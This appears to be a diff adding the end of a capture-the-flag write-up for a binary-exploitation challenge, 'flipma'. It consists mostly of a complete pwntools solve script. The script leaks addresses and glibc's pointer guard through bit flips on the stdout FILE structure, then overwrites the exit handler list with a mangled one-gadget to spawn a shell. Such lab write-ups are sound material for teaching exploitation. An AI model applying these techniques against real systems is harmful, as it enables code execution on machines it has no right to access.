@@ -151,3 +151,199 @@ def pointer_mangle(addr, key):
   return rol(addr ^ key, 0x11)
 ```
 
+Finally
+
+```py
+# one gadget
+og = libc.address + 0xe3afe
+
+_dl_fini_addr = libc.address + (0x7f9428371d60 - 0x7f942816c000)
+
+# location of exit funcs list
+initial_addr = libc.address + (0x7f33bb27dca0 - 0x7f33bb090000)
+current_value = pointer_mangle(_dl_fini_addr, pointer_guard)
+target_value = pointer_mangle(og, pointer_guard)
+
+# offset of the encrypted address in the exit func
+target_addr = initial_addr + 0x18
+
+write_to_addr(target_value, current_value, target_addr)
+
+print(f"{hex(og)=}")
+print(f"{hex(current_value)=}")
+print(f"{hex(target_value)=}")
+print(f"{hex(target_addr)=}")
+
+# use remaining flips to go back to exit
+while True:
+  if b"no more flips" in p.recv(4096):
+    break
+  p.unrecv(b"a: ")
+
+  sla(b"a: ", "100")
+  sla(b"b: ", "7")
+
+# debug()
+
+p.interactive()
+```
+
+We can overwrite the exit func list located at target_addr, with the target value after encrypting it
+
+## Solve Script
+
+```py
+#!/usr/bin/python
+
+from pwn import *
+import warnings
+import time
+
+warnings.filterwarnings("ignore",category=BytesWarning)
+
+exe = context.binary = ELF('./flipma_patched')
+libc = ELF('./libc.so.6')
+
+# host =
+# port =
+
+gdb_script = '''
+
+'''
+
+r = lambda x: p.recv(x)
+rl = lambda: p.recvline(keepends=False)
+ru = lambda x: p.recvuntil(x, drop=True)
+cl = lambda: p.clean(timeout=1)
+s = lambda x: p.send(x)
+sa = lambda x, y: p.sendafter(x, y)
+sl = lambda x: p.sendline(x)
+sla = lambda x, y: p.sendlineafter(x, y)
+ia = lambda: p.interactive()
+li = lambda s: log.info(s)
+ls = lambda s: log.success(s)
+
+def debug():
+  gdb.attach(p)
+  p.interactive()
+
+p = exe.process()
+#p = remote(host,port)
+#p = gdb.debug('./', gdbscript = gdb_script)
+
+stdout = 0xd20
+write_base = stdout + 0x20
+read_end = stdout + 0x10
+
+## we also need to make sure the _IO_CURRENTLY_PUTTING flag is set, and I initially thought we needed to use a bit flip on this, 
+## but just initializing stdout with an additional puts before the flips also works.
+sla(b"a: ", "9")
+sla(b"b: ", "9")
+# debug()
+
+## _IO_write_base
+sla(b"a: ", str(write_base+1))
+sla(b"b: ", "5")
+
+## _IO_read_end
+sla(b"a: ", str(read_end+1))
+sla(b"b: ", "5")
+# debug()
+
+#puts
+sla(b"a: ", "9")
+sla(b"b: ", "9")
+
+data = p.recvuntil(b"we're flipping bits, not burgers", timeout=1)
+if len(data) < 100:
+  print("failed")
+  exit(1)
+
+diff = 0x7f0c55badf4a - 0x00007f0c55bad723
+elf_leak = u64(data[diff-2:diff+6])
+exe.address = elf_leak - (0x55ff52d83020 - 0x55ff52d7f000)
+li(f"exe addr @ {hex(exe.address)}")
+
+# p.interactive()
+
+libc_leak = data[-100+41:-100+41+8]
+libc.address = u64(libc_leak) - libc.sym["_IO_2_1_stdin_"]
+li(f"libc addr @ {hex(libc.address)}")
+
+print(len(str(exe.sym["flips"] - libc.sym["_IO_2_1_stdin_"])))
+print(hex(exe.sym["flips"] - libc.sym["_IO_2_1_stdin_"]))
+
+## Make flip to big number
+sla(b"a: ", str(exe.sym["flips"] - libc.sym["_IO_2_1_stdin_"]))
+sla(b"b: ", "7")
+
+# debug()
+
+fsbase = libc.address + (0x7ffff7fc85c0 - 0x7ffff7dd5000)
+fskey = fsbase + 0x30
+
+def write_to_addr(target, current, addr):
+  bits = target ^ current
+  print(f"{hex(bits)=}")
+  for i, v in enumerate(bin(bits)[2:][::-1]):
+    print(i, v)
+    byte_num = i // 8
+    bit_num = i % 8
+    if v == "1":
+      sla(b"a: ", str(addr - libc.sym["_IO_2_1_stdin_"] + byte_num))
+      sla(b"b: ", str(bit_num))
+
+## set stdout->write_base = fskey
+## set stdout->read_end = fskey
+## set stdout->write_ptr = fskey + 8
+shortbuf = 0x83 + libc.symbols["_IO_2_1_stdout_"]
+li(f"shortbuf = {hex(shortbuf)}")
+
+write_to_addr(fskey, shortbuf, libc.symbols["_IO_2_1_stdout_"] + 0x10)
+write_to_addr(fskey, shortbuf, libc.symbols["_IO_2_1_stdout_"] + 0x20)
+write_to_addr(fskey+8, shortbuf, libc.symbols["_IO_2_1_stdout_"] + 0x28)
+
+# debug()
+
+sla(b"a: ", "9")
+sla(b"b: ", "9")
+
+pointer_guard = u64(r(8))
+print(f"{hex(pointer_guard)=}")
+
+def pointer_demangle(addr, key):
+  return ror(addr, 0x11) ^ key
+
+def pointer_mangle(addr, key):
+  return rol(addr ^ key, 0x11)
+
+# one gadget
+og = libc.address + 0xe3afe
+
+_dl_fini_addr = libc.address + (0x7f9428371d60 - 0x7f942816c000)
+
+# location of exit funcs list
+initial_addr = libc.address + (0x7f33bb27dca0 - 0x7f33bb090000)
+current_value = pointer_mangle(_dl_fini_addr, pointer_guard)
+target_value = pointer_mangle(og, pointer_guard)
+
+# offset of the encrypted address in the exit func
+target_addr = initial_addr + 0x18
+
+write_to_addr(target_value, current_value, target_addr)
+
+print(f"{hex(og)=}")
+print(f"{hex(current_value)=}")
+print(f"{hex(target_value)=}")
+print(f"{hex(target_addr)=}")
+
+# use remaining flips to go back to exit
+while True:
+  if b"no more flips" in p.recv(4096):
+    break
+  p.unrecv(b"a: ")
+  sla(b"a: ", "100")
+  sla(b"b: ", "7")
+
+p.interactive()
+```
